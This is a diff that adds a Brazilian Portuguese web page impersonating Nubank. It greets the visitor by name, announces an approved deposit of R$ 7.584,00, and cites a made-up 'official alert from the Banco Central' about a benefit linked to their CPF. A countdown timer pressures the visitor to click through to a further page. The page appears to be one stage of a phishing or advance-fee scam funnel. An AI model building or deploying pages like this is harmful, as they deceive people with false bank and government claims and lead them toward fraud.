@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Depósito Liberado</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    background: #eee;
+    font-family: 'Inter', sans-serif;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+  .container {
+
+    background: #d3d3d3;
+
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+  header {
+    background: #000;
+    padding: 14px 0 10px 20px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  header .logo-text {
+    font-family: 'Inter', sans-serif;
+    font-weight: 700;
+    color: #fff;
+    font-size: 1.5rem;
+    user-select: none;
+  }
+  header .logo-circle {
+    width: 20px;
+    height: 20px;
+    background: #820AD1;
+    border-radius: 50%;
+    user-select: none;
+  }
+  .yellow-line {
+    height: 10px;
+    background: #820AD1;
+    width: 100%;
+  }
+  main {
+    background: #fafafa;
+    border-radius: 0 0 18px 18px;
+    padding: 24px 20px 36px 20px;
+    display: flex;
+    flex-direction: column;
+  }
+  main h1 {
+    margin: 0 0 20px 0;
+    font-weight: 900;
+    font-size: 1.3rem;
+    color: #000;
+    letter-spacing: 0.05em;
+    user-select: none;
+  }
+  .message-box {
+    background: #fff;
+    border-radius: 10px;
+    margin-bottom: 20px;
+    padding: 14px 16px;
+    box-shadow: 0 1px 2px rgb(0 0 0 / 0.1);
+    font-size: 0.9rem;
+    font-weight: 400;
+    color: #222;
+    line-height: 1.4;
+    user-select: text;
+  }
+  .message-box strong {
+    font-weight: 700;
+  }
+  .message-box span.emoji {
+    font-weight: 700;
+    font-size: 1.2rem;
+  }
+  .message-box.blue {
+    background: #2f59a1;
+    color: #fff;
+    font-weight: 600;
+    line-height: 1.3;
+  }
+  .message-box.blue strong {
+    color: #fff;
+  }
+  .message-box.blue u {
+    text-decoration: underline;
+  }
+  button {
+    background: #2f59a1;
+    color: white;
+    font-weight: 700;
+    font-size: 1.1rem;
+    border: none;
+    outline: none;
+    cursor: pointer;
+    border-radius: 30px;
+    padding: 14px 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 12px;
+    margin: 0 auto 12px auto;
+    max-width: 270px;
+    user-select: none;
+    transition: background-color 0.3s ease;
+  }
+  button:hover,
+  button:focus {
+    background: #244b84;
+  }
+  button svg {
+    fill: white;
+    width: 18px;
+    height: 18px;
+  }
+  .timer {
+    text-align: center;
+    font-size: 0.85rem;
+    font-weight: 400;
+    color: #000;
+    user-select: none;
+  }
+  .timer strong {
+    color: #dd1b1b;
+    font-weight: 700;
+  }
+</style>
+</head>
+<body>
+  <div class="container" role="main" aria-label="Depósito liberado">
+    <header>
+      <div style="display: flex;justify-content: center;">  <img src="https://www.melhorcambio.com/cartoes/images/nubank-logo.png" width="60px" alt=""></div>
+
+    </header>
+    <div class="yellow-line"></div>
+    <main>
+      <h1>DEPÓSITO LIBERADO</h1>
+
+      <div class="message-box" aria-live="polite">
+        <span id="primeiro-nome"></span>, o valor de <span id="approvedAmount">XXX</span> já foi aprovado e encaminhado ao setor financeiro para <strong>Transação</strong>.
+      </div>
+      
+<script>
+  window.addEventListener("DOMContentLoaded", function () {
+    const params = new URLSearchParams(window.location.search)
+    let nome = params.get("nome") || ""
+    let valor = localStorage.getItem("creditoAprovado") || "7.584,00"
+
+    if (!nome) {
+      const nomeLs = localStorage.getItem("nomeUsuario") || ""
+      if (nomeLs) nome = nomeLs
+      else {
+        const dadosRaw = localStorage.getItem("dadosUsuario") || ""
+        if (dadosRaw) {
+          try {
+            const dados = JSON.parse(dadosRaw)
+            if (dados && dados.nome) nome = dados.nome
+          } catch (e) {}
+        }
+      }
+    }
+
+    function normalizarNome(v) {
+      const s = String(v || "").trim()
+      if (!s) return ""
+      try {
+        return decodeURIComponent(s.replace(/\+/g, " "))
+      } catch (e) {
+        return s.replace(/\+/g, " ")
+      }
+    }
+
+    nome = normalizarNome(nome)
+    const primeiroNome = nome.split(/\s+/)[0] || ""
+
+    const primeiroNomeEl = document.getElementById("primeiro-nome")
+    const valorEl = document.getElementById("approvedAmount")
+
+    if (primeiroNomeEl && primeiroNome)
+      primeiroNomeEl.textContent = primeiroNome
+
+    if (valorEl)
+      valorEl.textContent = "R$ " + valor
+  })
+</script>
+
+
+
+
+
+      <div class="message-box" aria-live="polite">
+        O financeiro está <strong>finalizando a liberação</strong> do seu valor. <span class="emoji" aria-label="coração amarelo">💜</span>
+      </div>
+
+      <div class="message-box blue" aria-live="assertive">
+        Atenção: Acabamos de receber um alerta oficial do Banco Central. Seu CPF tem <u>um benefício exclusivo disponível</u> aguardando liberação.
+      </div>
+
+      <button type="button" id="beneficioBtn" aria-label="Receber benefício">
+        RECEBER BENEFÍCIO 
+        <svg viewBox="0 0 20 20" aria-hidden="true" focusable="false" >
+          <path d="M7 5l5 5-5 5V5z"/>
+        </svg>
+      </button>
+
+      <div class="timer">
+  Tempo restante para Resgatar - <strong id="rescue-timer">04:52</strong>
+</div>
+   <!-- Modal de Loading -->
+    <div class="modal-overlay" id="loadingModal">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+  
+        document.getElementById('beneficioBtn').addEventListener('click', function() {
+            // Mostra o modal de loading
+            const modal = document.getElementById('loadingModal');
+            modal.classList.add('active');
+            
+            // Redireciona após um pequeno delay para garantir que o modal seja visto
+            setTimeout(function() {
+                window.location.href = 'page.html' + window.location.search;
+            }, 500);
+        });
+    </script>    <style>
+        /* Estilo do modal de loading */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+        
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+<script>
+  // Tempo inicial em segundos (4 minutos e 52 segundos)
+  let remainingTime = 4 * 60 + 52;
+
+  const timerDisplay = document.getElementById("rescue-timer");
+
+  function updateTimer() {
+    const minutes = Math.floor(remainingTime / 60);
+    const seconds = remainingTime % 60;
+
+    // Atualiza o conteúdo do <strong>
+    timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+
+    // Quando chegar a zero, para o contador
+    if (remainingTime <= 0) {
+      clearInterval(timerInterval);
+      timerDisplay.textContent = "00:00";
+      return;
+    }
+
+    remainingTime--;
+  }
+
+  // Atualiza imediatamente e depois a cada segundo
+  updateTimer();
+  const timerInterval = setInterval(updateTimer, 1000);
+</script>
+
+    </main>
+  </div>
+</body>
+</html>
+
